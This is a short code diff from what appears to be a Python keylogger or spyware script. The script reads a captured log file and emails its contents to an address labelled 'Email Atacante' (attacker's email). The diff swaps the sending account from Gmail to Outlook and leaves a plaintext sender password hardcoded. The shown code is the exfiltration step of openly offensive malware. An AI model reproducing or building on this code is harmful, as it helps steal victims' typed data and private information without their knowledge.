@@ -11,7 +11,7 @@ dest_email = input("Email Atacante")
 def send_logs(filename,date_log):
 	with open(filename, "r") as log_file:
 		logs = log_file.read()
-		create_email('sendregistros@gmail.com','enviadorderegistros123',dest_email,'Logs : '+str(date_log),logs)
+		create_email('sendregistros@outlook.com','enviadorderegistros123',dest_email,'Logs : '+str(date_log),logs)
 	log_file.close()
 
 
